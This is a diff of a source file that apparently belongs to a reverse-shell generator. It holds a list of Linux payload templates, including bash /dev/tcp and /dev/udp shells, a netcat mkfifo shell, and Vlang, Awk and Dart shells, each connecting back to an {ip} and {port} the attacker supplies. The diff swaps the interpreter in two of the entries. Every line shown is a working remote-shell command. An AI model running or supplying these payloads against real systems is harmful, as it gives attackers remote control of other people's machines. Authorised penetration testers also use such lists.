@@ -11,7 +11,7 @@ const LINUX_PAYLOADS = {
 
   "Bash 5": `/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1`,
 
-  "Bash udp": `sh -i >& /dev/udp/{ip}/{port} 0>&1`,
+  "Bash udp": `bash -i >& /dev/udp/{ip}/{port} 0>&1`,
 
   "nc mkfifo": `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f`,
 
@@ -365,7 +365,7 @@ public class shell {{
 
   "Vlang": `echo 'import os' > /tmp/t.v && echo 'import net' >> /tmp/t.v && echo 'fn main() {{ mut sock := net.dial("{ip}", {port}) or {{ return }} os.dup2(sock.sockfd, 0) os.dup2(sock.sockfd, 1) os.dup2(sock.sockfd, 2) os.execve("/bin/sh", []string{{}}, []string{{}}) }}' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v`,
 
-  "Awk": `awk 'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null`,
+  "Awk": `gawk 'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null`,
 
   "Dart": `import 'dart:io';
 import 'dart:convert';
